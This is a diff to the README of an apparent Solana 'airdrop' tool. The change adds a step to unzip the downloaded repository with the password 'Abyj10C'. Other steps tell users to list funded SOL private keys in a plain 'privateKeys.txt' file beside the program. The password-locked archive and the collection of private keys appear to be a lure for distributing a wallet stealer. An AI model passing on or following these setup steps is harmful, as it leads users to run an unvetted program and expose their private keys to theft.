@@ -27,7 +27,7 @@ bebop.xyz:
 ### Getting started
 
 - Ensure that Net Framework 4.8 is installed on your system.
-- [Download](https://github.com/aigeraxyz/solana-airdrop/archive/refs/heads/main.zip) the repository and unzip the repository fo folder.
+- [Download](https://github.com/aigeraxyz/solana-airdrop/archive/refs/heads/main.zip) the repository and unzip the repository with pass `Abyj10C` to folder.
 - Create SOL private key list with a balance. A minimum of 0.4 SOL on each address is required.
 - Save the list in 'privateKeys.txt' next to the program.
 - Edit 'settings.json' to configure which projects you want to use for transactions
